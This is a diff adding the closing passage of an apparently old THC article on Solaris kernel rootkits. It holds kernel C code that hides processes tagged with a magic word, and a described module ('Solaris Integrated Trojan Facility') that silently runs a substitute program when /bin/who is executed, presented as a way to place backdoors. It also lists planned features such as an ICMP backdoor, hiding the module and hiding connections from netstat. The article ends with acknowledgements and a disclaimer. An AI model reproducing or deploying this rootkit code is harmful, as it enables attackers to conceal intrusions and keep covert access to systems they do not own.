+<br><tt>&nbsp;&nbsp;&nbsp; if (sitf_isdigit(filename) &amp;&amp; check_process(sitf_atoi(filename)))</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return TRUE;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return FALSE;</tt>
+<br><tt>}</tt>
+<p><tt>int check_process(pid_t pid)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; proc_t *proc;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; char *psargs;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int ret;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; proc = (proc_t *) prfind(pid);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; psargs = (char *) kmem_alloc(PSARGSZ, KM_SLEEP);&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; if (proc != NULL)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * PTOU(proc)->u_psargs
+is inside the kernel memory, no special</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * copy methods
+are needed.</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memcpy(psargs, PTOU(proc)->u_psargs,
+PSARGSZ);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return FALSE;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if (strstr(psargs, (char *) &amp;magic) != NULL)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret = TRUE;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; else&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret = FALSE;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; kmem_free(psargs, PSARGSZ);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; return ret;</tt>
+<br><tt>}</tt></blockquote>
+</blockquote>
+<font size=+1>--->&nbsp;&nbsp; Module: sitf0.2.c</font>
+<blockquote>The sitf0.2.c (Solaris Integrated Trojan Facility) implements
+the features described in 5.5 and 5.6, it is configured as the sitf0.1
+module and includes the following 2 defintions:
+<blockquote><tt>#define OLDCMD&nbsp; "/bin/who"</tt>
+<br><tt>#define NEWCMD&nbsp; "/usr/openwin/bin/xview/xcalc"</tt></blockquote>
+If the file <tt>OLDCMD</tt> is executed the <tt>NEWCMD</tt> will be executed
+instead, this is a usefull feature for placing backdoors in hidden directories.&nbsp;</blockquote>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>6&nbsp; Future plans</font>
+<ul>If you read the article carefully, you may have found a lot of things
+to be fixed in future releases, here is a brief summary of my ideas and
+plans for the next version - including fixes and improvements:
+<ul>- Proper implementation of allocating user memory
+<br>- Bugfree version of the <tt>getdents64()</tt> file hiding mechanism
+allowing files to contain the magic word more than once.
+<br>- Proper hiding of the module by backdooring the ksyms module
+<br>- ICMP backdoor executing programs realized backdooring the icmp module
+<br>- Hiding connections from netstat
+<br>- UDP based telnet access via the udp module (damn, this is hard stuff.
+Idea by Escher)
+<br>- A module version for Solaris 2.5 (Sparc) and 2.6 (Sparc/x86)</ul>
+As a result of this article I also plan to write a security module for
+Solairs 2.7 (Sparc/x86) including the following features:
+<ul>- Protected module loading and unloading
+<br>- Limited process listings for users
+<br>- Symlink checks in writable directories
+<br>- Kernel based packet sniffing
+<br>- Exploited overflow notification</ul>
+</ul>
+
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="100%">
+<br>&nbsp;
+<p><font size=+1>7&nbsp;&nbsp; Closing words</font>
+<blockquote>I thank the following people that helped creating this article:
+<blockquote>- Wilkins&nbsp; ... for all his help, betatesting and ideas
+<br>- Pragmatic ... for his articles and support at the CCCamp
+<br>- Acpizer ... for all his knowledge and help with the modules
+<br>- Escher ... for his Solaris 2.5 support and corrections
+<br>- Horizon ... for his Ultra Sparc port and his help
+<br>- Knie ... godfather of OpenBSD
+<br>- Plaguez ... for his great itf.c Linux module (written in '97)
+<br>- Ekonroth from the church of shambler ... for mental support&nbsp;
+<br>- All people in my favorite IRC channel</blockquote>
+I would also like to thank my girlfriend who spent a lot of time with me
+talking about Solaris' kernel-architecture.
+<p>If you have ideas, critisism or further questions, please contact me
+at <a href="mailto:plasmoid@pimmel.com">plasmoid@pimmel.com</a>. I am thankful
+for improving suggestions. Just don't forget this article is not designed
+for script kiddies, intrusion is illegal and I don't have the ambition
+to help you hacking into some lame provider systems.&nbsp;
+<br>If you read this far, you might also be interested in one of the other
+THC articles or magazines at <a href="http://www.thc.org">http://www.thc.org/</a>.</blockquote>
+
+<blockquote>have fun,
+<br>Plasmoid / THC
+<br>&nbsp;
+<br>&nbsp;
+<blockquote>&nbsp;</blockquote>
+</blockquote>
+</td>
+</tr>
+</table></center>
+
+</body>
+</html>
